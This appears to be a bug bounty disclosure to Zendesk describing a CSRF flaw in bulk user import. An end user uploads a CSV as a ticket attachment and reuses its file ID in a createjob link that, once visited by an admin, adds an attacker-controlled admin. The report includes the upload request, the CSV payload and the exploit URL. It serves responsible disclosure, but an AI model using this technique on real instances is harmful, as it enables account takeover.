Summary:

Hi , I have found a CSRF issue in `<your_zebdesk>.zendesk.com/jobs/createjob` that leads to full account take over.
#Details: 
When using bulk user import in `https://<your_zendesk>.zendesk.com/import?kind=user` after you upload a CSV file and press import , a request is sent to `https://<your_zendesk>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import`. 
if you look at the request you'll see that the only token sent in the request is the `job[token]` value , so I have tried to change the url to `https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import` , but the import failed and I received an email saying that there was an error when importing the users , but the error gave me a hint , This was the email: 
```
For some reason the data to import was not ready in our servers. Try again.

We've been notified about this and will solve the problem if there's a bug. If the error persists, please contact our support team. The error was:

undefined method `attachments' for nil:NilClass
```
as you can see the error gives a hint that the `job[token]` parameter value is an id of the uploaded CSV file which can only be generated when uploading the csv file in the bulk user import page. 
But , wait a second , it says `attachments` which mean it's actually an id of an attachment , so if the attacker signed up as an end user account and tried to submit a ticket then uploaded his csv file as an attachment and got the file id and replaced it with the `job[token]` parameter value , so the link will look like : 
`https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import`, it will work and if the attacker sent that link to an admin user and the admin visited it , a user with admin privileges will be added!

#Steps to reproduce:
1. Login to your zendesk account as an end-user 
2.  Send this POST request through the end user:

```
 POST https://<account>.zendesk.com/hc/en-us/request_uploads
Host: sad69.zendesk.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF-Token: KVUlCzxLTdJRkLuZrsGoYMNWgaL56Y3Rg3SwX6DyuMi7UkWo7pEV2I7auJVAmD8k+KKo6d5o0wsouRjzWwsvWQ==

<your_token>

Content-Disposition: form-data; name="file"; filename="csv.csv"
Content-Type: application/vnd.ms-excel

"name","email","external_id","details","notes","phone","role",
"restriction","organization","tags"
Hacker,"attacker@example.com",,,,,"admin","This is a hacker",,
-----------------------------3915858413600--
```

3- Now get the response of the request then get the `ID` of the uploaded file , which will look like this `dwYMJH6N8QloZt7lFJeZ9bN26` (Please note that the id is not the attachment token)
4- After that logout from the end user account then login with the account owner account and go to:

```
https://<account>.zendesk.com/jobs/create?job[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import
```
5- Go to the agent email and you'll see an email saying that user import successfully completed , also you can verify by going to `https://<your_account>.zendesk.com/users` and you'll see that an admin named **Hacker** Was added. 

I will attach the CSV file for importing the user , just in case you are having a trouble sending the request in step 2. 

Thanks.
